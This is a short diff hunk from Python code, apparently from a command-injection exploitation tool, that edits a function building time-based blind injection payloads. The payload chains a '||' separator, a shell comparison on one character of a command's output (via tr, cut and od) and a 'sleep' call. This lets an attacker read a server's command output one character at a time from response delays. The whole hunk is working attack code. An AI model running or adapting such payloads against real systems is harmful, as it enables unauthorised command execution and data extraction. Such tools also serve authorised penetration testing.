@@ -426,7 +426,7 @@ def get_char(separator, cmd, num_of_chars, ascii_char, delay, http_request_metho
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
-                "[ " + str(ascii_char) + " != $(" + cmd + pipe + "tr '\\n' ' '" + pipe + "cut -c " + str(num_of_chars) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2) ] " + separator + 
+                "[ " + str(ascii_char) + " != $(" + cmd + pipe + "tr '\\n' ' '" + pipe + "cut -c " + str(num_of_chars) + pipe + "od -N 1 -i"+ pipe + "head -1"+ pipe + "tr -s ' '" + pipe + "cut -d ' ' -f 2) ] " + separator + 
                 "sleep " + str(delay) + " "
                 )  
     else:
